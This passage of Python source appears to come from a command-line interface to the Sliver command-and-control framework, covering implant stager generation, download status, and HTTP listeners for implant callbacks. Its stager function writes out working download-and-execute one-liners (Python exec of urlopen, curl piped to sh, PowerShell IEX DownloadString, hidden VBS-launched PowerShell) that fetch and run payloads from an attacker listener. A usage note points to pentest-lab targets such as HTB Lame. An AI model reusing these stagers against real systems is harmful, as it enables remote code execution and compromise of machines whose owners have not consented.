            self._print(f"[red]Invalid stager type: {stager_type}[/red]")
            self._print("[dim]Valid types: python, python2, python3, bash, powershell, vbs, minimal, debug[/dim]")
            return

        try:
            # Get all listeners to find the one we need
            listeners = await self.c2.list_stager_listeners()
            listener = None
            for lst in listeners:
                if lst.id == listener_id:
                    listener = lst
                    break

            if not listener:
                self._print(f"[red]Stager listener '{listener_id}' not found[/red]")
                self._print("[dim]Use '/sliver stager list' to see active listeners[/dim]")
                return

            # Print the stager for the requested type
            self._print_stager_by_type(listener.url, stager_type)

        except NotImplementedError:
            # Fallback: assume listener_id is actually a URL for now
            self._print_stager_by_type(f"http://{listener_id}", stager_type)
        except Exception as e:
            logger.error(f"Stager create failed: {e}")
            self._print(f"[red]Failed to create stager: {e}[/red]")

    def _print_stager_by_type(self, listener_url: str, stager_type: str) -> None:
        """Print stager code for specific type."""
        # This will be expanded with actual stager generation
        stagers = {
            "python": (
                # Legacy: same as python2 for backward compatibility
                f'python -c "import urllib2,platform;'
                f"o=platform.system().lower();"
                f"a='64' if '64' in platform.machine() else '32';"
                f"exec(urllib2.urlopen('{listener_url}/s?o='+o+'&a='+a).read())\""
            ),
            "python2": (
                f'python -c "import urllib2,platform;'
                f"o=platform.system().lower();"
                f"a='64' if '64' in platform.machine() else '32';"
                f"exec(urllib2.urlopen('{listener_url}/s?o='+o+'&a='+a).read())\""
            ),
            "python3": (
                f'python3 -c "import urllib.request,platform;'
                f"o=platform.system().lower();"
                f"a='64' if '64' in platform.machine() else '32';"
                f"exec(urllib.request.urlopen('{listener_url}/s?o='+o+'&a='+a).read())\""
            ),
            "bash": (
                f'curl -s "{listener_url}/s?o=$(uname -s|tr [:upper:] [:lower:])'
                f'&a=$(uname -m|grep -q 64 && echo 64 || echo 32)" | sh'
            ),
            "powershell": (
                f"IEX(New-Object Net.WebClient).DownloadString("
                f"'{listener_url}/s?o=windows&a='+[Environment]::Is64BitProcess)"
            ),
            "vbs": (
                f'CreateObject("WScript.Shell").Run "powershell -c ""'
                f"IEX(New-Object Net.WebClient).DownloadString("
                f"'{listener_url}/s?o=windows&a=32')"
                f'""", 0, False'
            ),
            "minimal": (f"python -c \"import urllib2;exec(urllib2.urlopen('{listener_url}/s?o=linux&a=32').read())\""),
            "debug": (
                # Debug version with verbose output for troubleshooting
                f'python -c "'
                f"import urllib2,sys;"
                f'sys.stderr.write(\\"[DEBUG] Starting stager...\\\\n\\");'
                f'sys.stderr.write(\\"[DEBUG] URL: {listener_url}/s?o=linux&a=32\\\\n\\");'
                f"try:"
                f'  r=urllib2.urlopen(\\"{listener_url}/s?o=linux&a=32\\");'
                f"  d=r.read();"
                f'  sys.stderr.write(\\"[DEBUG] Downloaded %d bytes\\\\n\\" % len(d));'
                f"  exec(d)"
                f"except Exception,e:"
                f'  sys.stderr.write(\\"[ERROR] %s\\\\n\\" % str(e))"'
            ),
        }

        if stager_type in stagers:
            self._print(f"\n[bold]{stager_type.title()} Stager:[/bold]")
            self._print(f"[yellow]{stagers[stager_type]}[/yellow]")

            # Add usage notes for special types
            if stager_type == "python2":
                self._print("\n[dim]Note: Python 2 stager for old environments (HTB Lame, CentOS 6, etc.)[/dim]")
                self._print("[dim]Uses urllib2 module available in Python 2.x.[/dim]")
            elif stager_type == "python3":
                self._print("\n[dim]Note: Python 3 stager for modern environments.[/dim]")
                self._print("[dim]Uses urllib.request module available in Python 3.x.[/dim]")
            elif stager_type == "minimal":
                self._print("\n[dim]Note: Minimal stager assumes Linux 32-bit. No OS detection.[/dim]")
                self._print("[dim]Use this for very restrictive shells where regular stager fails.[/dim]")
            elif stager_type == "debug":
                self._print("\n[dim]Note: Debug stager outputs verbose info to stderr.[/dim]")
                self._print("[dim]Use this to troubleshoot stager issues in poor environments.[/dim]")

    async def _handle_stager_status(self, args: list[str]) -> None:
        """Handle stager status command to show active downloads."""
        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        try:
            downloads = await self.c2.get_stager_downloads()

            if not downloads:
                self._print("[yellow]No active downloads[/yellow]")
                return

            # Create table
            table = Table(title="Active Stager Downloads", show_header=True)
            table.add_column("Client", style="cyan")
            table.add_column("Implant", style="green")
            table.add_column("Progress", style="yellow")
            table.add_column("Speed", style="blue")
            table.add_column("Status", style="magenta")
            table.add_column("Time", style="dim")

            for dl in downloads:
                # Calculate progress percentage
                if dl.size > 0:
                    progress = f"{dl.transferred / dl.size * 100:.1f}%"
                    progress_bar = f"{dl.transferred:,} / {dl.size:,} bytes"
                else:
                    progress = "0%"
                    progress_bar = "0 bytes"

                # Calculate elapsed time
                elapsed = datetime.now() - dl.started
                elapsed_str = f"{int(elapsed.total_seconds())}s"

                # Calculate speed (bytes per second)
                if elapsed.total_seconds() > 0:
                    speed_bps = dl.transferred / elapsed.total_seconds()
                    if speed_bps > 1024 * 1024:
                        speed_str = f"{speed_bps / 1024 / 1024:.1f} MB/s"
                    elif speed_bps > 1024:
                        speed_str = f"{speed_bps / 1024:.1f} KB/s"
                    else:
                        speed_str = f"{speed_bps:.0f} B/s"
                else:
                    speed_str = "N/A"

                # Status color
                status_colored = dl.status
                if dl.status == "downloading":
                    status_colored = f"[yellow]{dl.status}[/yellow]"
                elif dl.status == "completed":
                    status_colored = f"[green]{dl.status}[/green]"
                elif dl.status == "failed":
                    status_colored = f"[red]{dl.status}[/red]"

                table.add_row(
                    dl.client, dl.implant, f"{progress}\n{progress_bar}", speed_str, status_colored, elapsed_str
                )

            self._print(table)

            # Show summary
            active_count = sum(1 for dl in downloads if dl.status == "downloading")
            if active_count > 0:
                self._print(f"\n[dim]Active downloads: {active_count}[/dim]")

        except Exception as e:
            logger.error(f"Failed to get stager status: {e}")
            self._print(f"[red]Failed to get download status: {e}[/red]")

    async def handle_http(self, args: list[str]) -> None:
        """Handle HTTP listener commands."""
        if not args:
            await self._show_http_help()
            return

        subcommand = args[0].lower()

        if subcommand == "start":
            await self._handle_http_start(args[1:])
        elif subcommand == "stop":
            await self._handle_http_stop(args[1:])
        elif subcommand == "list":
            await self._handle_http_list(args[1:])
        elif subcommand == "help":
            await self._show_http_help()
        else:
            self._print(f"[red]Unknown HTTP command: {subcommand}[/red]")
            await self._show_http_help()

    async def _show_http_help(self) -> None:
        """Show HTTP listener command help."""
        help_text = """[bold]HTTP Listener Commands[/bold]

[bold blue]Commands:[/bold blue]
  start --host <IP> [--port <port>]  Start HTTP listener for implant callbacks
  stop <job-id>                      Stop HTTP listener
  list                               List active HTTP listeners

[bold blue]Description:[/bold blue]
HTTP listeners receive callbacks from implants. When an implant is executed,
it connects back to the HTTP listener to establish a session.

[bold blue]Example:[/bold blue]
  /sliver http start --host 10.10.14.2 --port 80
  /sliver http list
        """
        self._print(Panel(help_text, title="HTTP Listener Help", border_style="blue"))

    async def _handle_http_start(self, args: list[str]) -> None:
        """Handle HTTP listener start command."""
        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        # Parse arguments
        host = None
        port = 80  # Default HTTP port

        i = 0
        while i < len(args):
            arg = args[i]
            if arg in ["--host", "-h"] and i + 1 < len(args):
                host = args[i + 1]
                i += 2
            elif arg in ["--port", "-p"] and i + 1 < len(args):
                try:
                    port = int(args[i + 1])
                except ValueError:
                    self._print(f"[red]Invalid port: {args[i + 1]}[/red]")
                    return
                i += 2
            else:
                i += 1

        if not host:
            self._print("[red]Usage: /sliver http start --host <IP> [--port <port>][/red]")
            return

        try:
            self._print(f"[dim]Starting HTTP listener on {host}:{port}...[/dim]")
            listener_info = await self.c2.start_http_listener(host, port)

            self._print(
                Panel(
                    f"[green]✓ HTTP listener started[/green]\n\n"
                    f"Job ID: {listener_info['id']}\n"
                    f"Address: {listener_info['host']}:{listener_info['port']}\n"
                    f"Protocol: {listener_info['protocol']}\n"
                    f"Status: {listener_info['status']}",
                    title="HTTP Listener",
                    border_style="green",
                )
            )

            self._print("\n[dim]Implants will connect to this listener for callbacks[/dim]")

        except Exception as e:
            logger.error(f"HTTP listener start failed: {e}")
            self._print(f"[red]Failed to start HTTP listener: {e}[/red]")

    async def _handle_http_stop(self, args: list[str]) -> None:
        """Handle HTTP listener stop command."""
        if not args:
            self._print("[red]Usage: /sliver http stop <job-id>[/red]")
            return

        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        job_id = args[0]
        try:
            success = await self.c2.stop_http_listener(job_id)
            if success:
                self._print(f"[green]✓ Stopped HTTP listener: {job_id}[/green]")
            else:
                self._print(f"[red]Failed to stop HTTP listener: {job_id}[/red]")
        except Exception as e:
            logger.error(f"HTTP listener stop failed: {e}")
            self._print(f"[red]Failed to stop HTTP listener: {e}[/red]")

    async def _handle_http_list(self, args: list[str]) -> None:
        """Handle HTTP listener list command."""
        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        try:
            listeners = await self.c2.list_http_listeners()

            if not listeners:
                self._print("[yellow]No active HTTP listeners[/yellow]")
                self._print("\n[dim]Start one with: /sliver http start --host <IP>[/dim]")
                return

            table = Table(title="Active HTTP Listeners", show_header=True)
            table.add_column("Job ID", style="cyan")
            table.add_column("Address", style="green")
            table.add_column("Protocol", style="yellow")
            table.add_column("Status", style="magenta")

            for listener in listeners:
                table.add_row(
                    listener.get("id", "unknown"),
                    f"{listener.get('host', '?')}:{listener.get('port', '?')}",
                    listener.get("protocol", "http"),
                    listener.get("status", "unknown"),
                )

            self._print(table)

        except Exception as e:
            logger.error(f"Failed to list HTTP listeners: {e}")
            self._print(f"[red]Failed to list HTTP listeners: {e}[/red]")
